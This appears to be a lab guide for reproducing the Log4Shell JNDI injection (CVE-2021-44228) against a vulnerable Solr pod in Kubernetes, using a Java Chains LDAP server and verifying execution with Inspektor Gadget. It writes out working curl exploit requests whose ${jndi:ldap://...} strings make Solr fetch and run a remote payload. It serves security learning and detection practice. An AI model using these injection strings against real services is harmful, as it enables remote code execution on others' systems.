# Apache Log4j2 Lookup Feature JNDI Injection (CVE-2021-44228)

## Overview

``` mermaid
flowchart TD
  javachains["Pod: Java Chains 10.244.0.82:8011 10.244.0.82:50389"]
  solr["Pod: Apache Solr v8.11.0 10.244.0.80:8983"]
  curl["curl"]
  
  solr -- "LDAP (Download Payload)" --> javachains
  curl -- "curl -v 'http://localhost:8983/solr/admin/cores?action=${jndi:ldap://10.244.0.82:50389/b37308}'" --> solr
```

## [WIP] Create and Start Lima VM

TODO

## Deploy Apache Solr

Deploy Apache Solr 8.11.0 as a Kubernetes pod:

```
k apply -f code/vulnerabilities/cve-2021-44228/all.yaml
```

Start listening on port `8983` locally, forwarding data to/from port `8983` in the
`solr` pod.

```
k port-forward -n solr pods/solr 8983:8983
```

Navigate to Java Chains Web UI at <http://localhost:8983>.

## Deploy Java Chains

Deploy Java Chains as a Kubernetes pod:

```
k apply -f code/javachains/javachains.kubernetes.yaml
```

If everything goes well, start listening on port 8011 locally, forwarding data
to/from port 8011 in the `javachains` pod.

```
k port-forward -n javachains pod/javachains 8011:8011
```

Navigate to Java Chains Web UI at <http://localhost:8011> and log in as `admin:admin`.

Go to [JNDI / JNDI Control](http://localhost:8011/#/JNDI/jndi-chains-control) page, set
the IP Address (Reverse IP) to 10.244.0.82 and click the Start button to launch
the embedded JNDI server. The LDAP URL should be `ldap://10.244.0.82:50389/x`.

![](./images/javachains-jndi-control.png)

## Create JNDIBasicPayload to Execute Commands

### Write to the /tmp Directory

Go to [JNDI / JNDIBasicPayload](http://localhost:8011/#/JNDI/JNDIBasicPayload) page
and generate payload to execute the `touch /tmp/passwd` command.

![](./images/javachains-jndi-basic-payload-execute-command.png)

Copy the payload `ldap://10.244.0.82:50389/d4db3d` and use it in the following curl command:

```
curl -v 'http://localhost:8983/solr/admin/cores?action=${jndi:ldap://10.244.0.82:50389/d4db3d}'
```

Alternatively, open <http://localhost:8983/solr/admin/cores?action=${jndi:ldap://10.244.0.82:50389/d4db3d}>
in a web browser.

### [WIP] Open a Web Shell

TODO

## Use Inspektor Gadget to Verify that the Payload was Executed

```
k gadget run ghcr.io/inspektor-gadget/gadget/trace_exec:latest \
  --namespace solr \
  --output columns \
  --fields timestamp,proc.pid,proc.parent.pid,proc.comm,args,k8s.podName,k8s.namespace
```

## Cleanup

```
k delete -f code/vulnerabilities/cve-2021-44228/all.yaml
```

```
k delete -f code/javachains/javachains.kubernetes.yaml
```

## Further Reading

* <https://nvd.nist.gov/vuln/detail/cve-2021-44228/>
* <https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228/>
* <https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/>
* <https://java-chains.vulhub.org/docs/module/jndi#jndibasicpayload>
* <https://github.com/apache/solr>
* <https://github.com/christophetd/log4shell-vulnerable-app>
